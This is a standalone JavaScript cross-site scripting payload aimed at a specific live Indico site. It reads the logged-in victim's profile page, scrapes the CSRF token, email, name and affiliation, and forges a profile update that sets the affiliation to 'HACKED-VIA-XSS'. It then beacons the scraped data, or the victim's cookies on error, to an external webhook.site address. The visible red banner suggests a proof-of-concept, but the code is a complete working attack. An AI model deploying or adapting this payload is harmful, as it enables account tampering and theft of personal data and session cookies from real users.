(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;

  fetch('https://indico.iter.org/user/profile/', {
    credentials: 'include'
  })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      var csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
      var email = g(/name="email"[^>]*value="([^"]+)"/);
      var firstName = g(/name="first_name"[^>]*value="([^"]+)"/);
      var lastName = g(/name="last_name"[^>]*value="([^"]+)"/);
      var affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/);

      var evidence = {
        csrf: csrf,
        email_before: email,
        first_name: firstName,
        last_name: lastName,
        affiliation_before: affiliation
      };

      var payload = 'csrf_token=' + encodeURIComponent(csrf)
        + '&first_name=' + encodeURIComponent(firstName || '')
        + '&last_name=' + encodeURIComponent(lastName || '')
        + '&email=' + encodeURIComponent(email)
        + '&affiliation=' + encodeURIComponent('HACKED-VIA-XSS');

      fetch('https://indico.iter.org/user/profile/', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: payload,
        redirect: 'follow'
      })
        .then(function (r) {
          evidence.post_status = r.status;
          evidence.post_url = r.url;
          return r.text();
        })
        .then(function (html2) {
          evidence.post_response = html2.substring(0, 4000);
          report(evidence);
        });
    })
    .catch(function (err) {
      report({ error: err.message, cookies: cookies });
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'POST status: ' + (ev.post_status || '?') + '\n'
      + 'POST url: ' + (ev.post_url || '?') + '\n'
      + 'CSRF: ' + (ev.csrf || 'n/a');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
